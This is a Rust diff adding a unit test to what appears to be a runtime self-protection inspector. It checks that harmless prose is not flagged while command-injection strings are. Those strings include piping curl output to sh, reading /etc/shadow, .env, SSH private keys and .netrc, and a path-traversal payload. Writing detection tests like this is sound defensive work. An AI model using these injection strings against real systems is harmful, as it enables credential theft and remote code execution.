@@ -90,6 +90,26 @@ fn test_rasp_ssrf_and_rce_detection() {
 }
 
 #[test]
+fn shell_signatures_need_a_command_not_a_word_prefix() {
+    // Prose that the old `| sh` and `; cat ` substrings refused.
+    for prose in ["Add it to the cart | shopping list", "dogs; cat food"] {
+        assert!(!RaspInspector::inspect_text(prose), "{prose}");
+    }
+    for attack in [
+        "| sh",
+        "x | SH -c id",
+        "curl http://x | sh;",
+        "; cat /etc/shadow",
+        "1; cat .env",
+        "1; cat ~/.ssh/id_rsa",
+        "1; CAT $HOME/.netrc",
+        "1;%20cat%20/etc/shadow",
+    ] {
+        assert!(RaspInspector::inspect_text(attack), "{attack}");
+    }
+}
+
+#[test]
 fn json_body_inspection_decodes_escaped_strings() {
     assert!(RaspInspector::inspect_body(
         r#"{"path":"\u002e\u002e/etc/passwd"}"#,
